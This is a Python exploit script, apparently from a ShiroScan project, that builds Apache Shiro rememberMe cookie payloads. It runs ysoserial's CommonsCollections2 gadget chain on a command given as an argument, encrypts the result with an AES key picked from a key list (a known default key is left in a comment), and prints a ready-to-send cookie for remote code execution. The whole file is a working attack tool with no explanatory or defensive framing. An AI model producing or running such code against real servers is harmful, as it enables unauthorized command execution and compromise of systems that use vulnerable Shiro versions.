#coding=utf-8
'''
@Author: your name
@Date: 2020-06-20 17:12:34
@LastEditTime: 2020-06-21 01:54:46
@LastEditors: Please set LastEditors
@Description: In User Settings Edit
@FilePath: \undefinede:\git\ShiroScan\moule\exploit.py
'''
import sys
import uuid
import base64
import subprocess
from Crypto.Cipher import AES
def encode_rememberme(command,keys):
    popen = subprocess.Popen(['java', '-jar', 'ysoserial.jar', 'CommonsCollections2', command], stdout=subprocess.PIPE)
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    #key = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")
    key = base64.b64decode(keys)
    iv = uuid.uuid4().bytes
    encryptor = AES.new(key, AES.MODE_CBC, iv)
    file_body = pad(popen.stdout.read())
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    return base64_ciphertext

def readfile(filepath):
    keylist = []
    f = open(filepath,'r')
    str = ''
    for lines in f:
        keylist.append(lines.replace('\n',''))
    return keylist


if __name__ == '__main__':
    i = 0
    listkey =  readfile("key.txt")
    for key in listkey:
        print "["+str(i).rjust(2,' ')+"].",key  
        i = i+ 1
    inputnum = input("Which key?  ")
    intnum = int(inputnum)
    key = listkey[intnum]
    payload = encode_rememberme(sys.argv[1],key)   
    
    
    print "rememberMe={0}".format(payload.decode())